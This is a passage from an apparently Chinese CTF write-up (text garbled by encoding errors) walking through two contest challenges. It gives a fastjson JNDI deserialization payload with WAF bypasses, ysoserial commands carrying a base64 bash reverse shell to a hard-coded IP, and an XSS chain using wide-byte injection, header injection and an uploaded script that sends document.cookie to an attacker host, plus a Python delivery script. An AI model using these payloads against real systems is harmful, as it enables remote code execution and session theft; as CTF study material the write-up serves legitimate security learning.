class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.tr1ple<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sus<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>baby_java<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>saxpath<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>saxpath<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-FCS<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-lang<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-lang<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flex.blazeds<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flex-messaging-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.7.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.48<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.vintage<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-vintage-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª/you_never_know_the_pathè·¯å¾„ï¼Œè¿˜æœ‰1.2.48fastjson,è¿˜æœ‰è¿™ä¸ªcommons-collectionsä¸œä¸œï¼Œç„¶åæŸ¥äº†ä¸‹fastjsonçš„æœ€è¿‘çš„æ¼æ´ï¼Œ<a href="https://0day.design/2020/01/30/fastjson%20%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">è¿™ç¯‡</a>æ–‡ç« å…·ä½“çš„åˆ†æäº†æ¼æ´ï¼Œç„¶åè¿™é‡Œå°±è´´å‡ºpayloadï¼Œ</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åç”¨è¿™ä¸ªpayloadæ‰“çš„è¯ï¼Œè¿˜æ˜¯ä¼šè§¦å‘waf,</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311143155288.png" alt="image-20200311143155288"></p>
<p>ç„¶åæµ‹è¯•å‘ç°å¯¹typeå’Œprefixè¿›è¡Œäº†è¿‡æ»¤ï¼Œä»ä¸Šé¢é‚£ç¯‡æ–‡ç« å¯ä»¥çŸ¥é“</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311143500149.png" alt="image-20200311143500149"></p>
<p>é‚£ä¹ˆå°±å¯ä»¥é€šè¿‡åå…­è¿›åˆ¶ç»•è¿‡typeçš„è¿‡æ»¤ï¼Œç„¶åå°±æ˜¯prefixçš„ç»•è¿‡ï¼Œ</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311144231267.png" alt="image-20200311144231267"></p>
<p><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#0x04-%E9%A2%98%E5%A4%96%E8%AF%9D" target="_blank" rel="noopener">å›¾ç‰‡æ¥æº</a></p>
<p>ç„¶åè¿™é‡Œå°±é€šè¿‡åœ¨prefixå‰é¢åŠ -æ¥ç»•è¿‡ï¼Œç„¶åå°±æ˜¯åœ¨vpsä¸Šå¼€ä¸€ä¸ªJRMPListener,ç„¶åé€šè¿‡fastjsonçš„æ¼æ´è§¦å‘æœåŠ¡å™¨è¿æ¥vpsçš„JRMPListenerï¼Œç„¶åç»™æœåŠ¡å™¨å‘é€åºåˆ—åŒ–çš„payload,è§¦å‘æœåŠ¡å™¨ååºåˆ—åŒ–ï¼Œæœ€årceã€‚</p>
<p>payloadï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener  8888 CommonsCollections7 'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMjAwLjE1MS81MDAwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span><br><span class="line">java -cp ysoserial.jar  ysoserial.exploit.JRMPClient  144.34.200.151 7777  CommonsCollections7 'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNDQuMzQuMjAwLjE1MS81MDAwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@\x74ype&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;-prefix&quot;:&quot;rmi:&#x2F;&#x2F;ip:8888&#x2F;Exploit&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸåå¼¹shellã€‚</p>
<img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200311145143273.png" alt="image-20200311145143273" style="zoom:200%;">

<p>å¦å¤–è¿˜æœ‰ç”¨åœ¨vpsä¸Šå¼€äº†ä¸€ä¸ªLDAPServer,æ¥åå¼¹shellï¼Œç”±äºjavaè¿˜ä¸æ˜¯å¤ªç†Ÿï¼Œè¿™é‡Œæ²¡æœ‰å¤ç°ï¼Œå¸ˆå‚…æœ‰ä¼šçš„å¯ä»¥å…­ä¸ªé“¾æ¥å•¥çš„ï¼Œæ•™æ•™æˆ‘è¿™ä¸ªèœé¸¡ï¼Œ</p>
<p>å‚è€ƒï¼š<a href="http://ctf.njupt.edu.cn/382.html#hackme" target="_blank" rel="noopener">http://ctf.njupt.edu.cn/382.html#hackme</a></p>
<h1 id="0x03-happy-vacation"><a href="#0x03-happy-vacation" class="headerlink" title="0x03  happy vacation"></a>0x03  happy vacation</h1><p>å‰ä¸€ç¯‡æ–‡ç« å·²ç»è®°å½•äº†è¿™é“é¢˜çš„éé¢„æœŸè§£ï¼Œæ¯”è¾ƒç®€å•ï¼Œè¿™é“é¢˜çš„é¢„æœŸè§£æ˜¯xss,æ¥ä¸‹æ¥è¿›è¡Œåˆ†æï¼Œ</p>
<p>xssçš„è§¦å‘ç‚¹åœ¨index.php</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312111745170.png" alt="image-20200312111745170"></p>
<p>ç„¶åè·Ÿè¿›lib.phpä¸­çš„showMessage</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showMessage</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;body&gt;&lt;script&gt; var a = '&#123;$this-&gt;info-&gt;message&#125;';document.write(a);&lt;/script&gt;&lt;/body&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¼šæŠŠ$this-&gt;info-&gt;messageï¼Œè¾“å‡ºå‡ºæ¥ï¼Œå¦‚æœæˆ‘ä»¬é—­åˆè¿™é‡Œçš„å•å¼•å·ï¼Œåœ¨åé¢åŠ ä¸Šjsè¯­å¥ï¼Œå°±å¯ä»¥è¿›è¡Œxssã€‚ç„¶åç»§ç»­çœ‹$this-&gt;info-&gt;messageï¼Œè¿™ä¸ªå€¼æ˜¯</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312112258374.png" alt="image-20200312112258374"></p>
<p>æˆ‘ä»¬getè¾“å…¥çš„messageå˜é‡ï¼Œç„¶åè°ƒç”¨leavemessageå¯¹è¾“å…¥è¿›è¡Œæ£€æµ‹åèµ‹ç»™$this-&gt;info-&gt;messageã€‚</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312112213426.png" alt="image-20200312112213426"></p>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯¹messageè¿›è¡Œäº†addslasheså¤„ç†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœæƒ³é—­åˆä¹‹å‰çš„å•å¼•å·ï¼Œå°±å¯ä»¥é€šè¿‡åƒsqlæ³¨å…¥ä¸­å®½å­—èŠ‚æ³¨å…¥çš„æ–¹æ³•ï¼Œ</p>
<img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312112846438.png" alt="image-20200312112846438" style="zoom:200%;">

<p><a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/3.html" target="_blank" rel="noopener">å›¾ç‰‡</a></p>
<p>ç„¶åå°±éœ€è¦æ‰¾åˆ°å¯ä»¥è®¾ç½®å“åº”ç¼–ç çš„åœ°æ–¹ï¼ŒåŒæ—¶è¿™é“é¢˜è¿˜æœ‰ä¸€ä¸ªevalçš„åˆ©ç”¨ç‚¹ï¼Œ</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312113714354.png" alt="image-20200312113714354"></p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312113641620.png" alt="image-20200312113641620"></p>
<p>ä¼šæŠŠæˆ‘ä»¬è¾“å…¥çš„answeræ‹¼æ¥åˆ°å‘½ä»¤æ‰§è¡Œä¸­ï¼Œè€Œä¸”å‰é¢è¿˜ç”¨äº†cloneæµ…å¤åˆ¶</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312113840370.png" alt="image-20200312113840370"></p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œä¿®æ”¹userçš„å±æ€§ï¼Œç„¶ååˆ†ælib.phpä¸­çš„goå‡½æ•°</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312114156603.png" alt="image-20200312114156603"></p>
<p>å¦‚æœthis-&gt;locationä¸ç­‰äºthis-&gt;pageï¼Œé‚£ä¹ˆå°±ä¼šè°ƒç”¨go()å‡½æ•°ï¼Œgoå‡½æ•°ä¸­ä¼šæŠŠpre after location è¿›è¡Œæ‹¼æ¥ï¼Œç„¶åä¼ ç»™header,å¦‚æœå¯ä»¥æ§åˆ¶è¿™ä¸‰ä¸ªå˜é‡ï¼Œå°±å¯ä»¥åœ¨è¿™é‡Œè®¾ç½®gb18130ç¼–ç ï¼Œè¾¾åˆ°å®½å­—èŠ‚æ³¨å…¥ã€‚ç„¶åå¯ä»¥åœ¨æœ¬åœ°æµ‹è¯•ï¼ŒæŠŠæºç ä¸­çš„//var_dump($user)ï¼›æ³¨é‡Šåˆ æ‰ï¼Œå¯ä»¥æ›´æ¸…æ™°çš„çœ‹å‡ºï¼Œ</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312114803092.png" alt="image-20200312114803092"></p>
<p>åœ¨ quiz.phpä¸­52ï¼Œ53è¡Œ</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312115014677.png" alt="image-20200312115014677"></p>
<p>url-&gt;pageä¸ºindex,å¦‚æœè¿™é‡Œä¼ å…¥çš„refererä¸ç­‰äºindexçš„è¯ï¼Œå°±ä¼šæŠŠ$refererèµ‹ç»™user-&gt;url-&gt;refererï¼Œç„¶ååœ¨45ï¼Œ46è¡Œï¼Œå¦‚æœ$user-&gt;url-&gt;referer != $user-&gt;url-&gt;pageï¼Œå°†user-&gt;url-&gt;refererèµ‹ç»™user-&gt;url-&gt;locationï¼Œæ‰€ä»¥è¿™é‡Œé€šè¿‡å‘é€ä¸¤æ¬¡è¯·æ±‚ï¼Œå°±å¯ä»¥æ§åˆ¶$user-&gt;url-&gt;locationçš„å€¼ï¼Œç„¶åå°±å¯ä»¥è°ƒç”¨headerå‡½æ•°ï¼Œpaylaodå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">quiz.php?referer&#x3D;Content-Type: text&#x2F;html; charset&#x3D;GBK; kkkk: &amp;answer&#x3D;user-%3Eurl-%3Epre</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿™é‡Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œxssï¼Œä½†æ˜¯åœ¨lib.phpå¼€å¤´</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"style-src 'self'; script-src 'unsafe-inline' http://&lt;?=$_SERVER['HTTP_HOST']?&gt;/; object-src 'none'; frame-src 'self'"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è®¾ç½®äº†cspï¼Œå°±ä¸èƒ½åœ¨messageç›´æ¥ä¼ å…¥æˆ‘ä»¬vpsæˆ–xsså¹³å°çš„é“¾æ¥äº†ï¼Œç„¶åè¿™é“é¢˜ç›®è¿˜æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶å†…å®¹ä¸º</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">window</span>.location = <span class="string">"http://ip:8888/"</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(a,<span class="number">1</span>);</span><br><span class="line"><span class="comment">//æˆ–</span></span><br><span class="line">location.href=<span class="string">"//xxxxxxx?c="</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookieï¼‰</span><br></pre></td></tr></table></figure>

<p>çš„æ–‡ä»¶ï¼Œåç¼€å¯ä»¥è®¾ä¸ºtxt,ç„¶ååœ¨index.phpä¸­ä¼ å…¥messageå€¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?message&#x3D;%df%27;jscode;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<p>pythonè„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">cookie=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"e3sugtvfki7aketdnkofbt9odu"</span>&#125;</span><br><span class="line">proxy=&#123;<span class="string">"http"</span>:<span class="string">"http:127.0.0.1:8080"</span>&#125;</span><br><span class="line">theurl=<span class="string">"http://192.168.35.158/gxzy-happyvacation/"</span></span><br><span class="line">thejs=<span class="string">"http://192.168.35.158/upload/56b6f09c50bfb4706563cdf3463a6cc3.txt"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p</span><span class="params">(sth)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sth:</span><br><span class="line">        result += str(ord(i))</span><br><span class="line">        result += <span class="string">","</span></span><br><span class="line">    <span class="keyword">return</span> result[<span class="number">0</span>:<span class="number">-1</span>]</span><br><span class="line">xss = p(<span class="string">"&lt;script src='$$$'&gt;&lt;/script&gt;"</span>.replace(<span class="string">"$$$"</span>,thejs))</span><br><span class="line">r=requests.get(theurl+<span class="string">"index.php"</span> + <span class="string">"?message=%df%27;document.write(String.fromCharCode($$$));//"</span>.replace(<span class="string">"$$$"</span>,xss),cookies=cookie,proxies=proxy)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†çœ‹ask.php</p>
<p><img src="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/image-20200312120608437.png" alt="image-20200312120608437"></p>
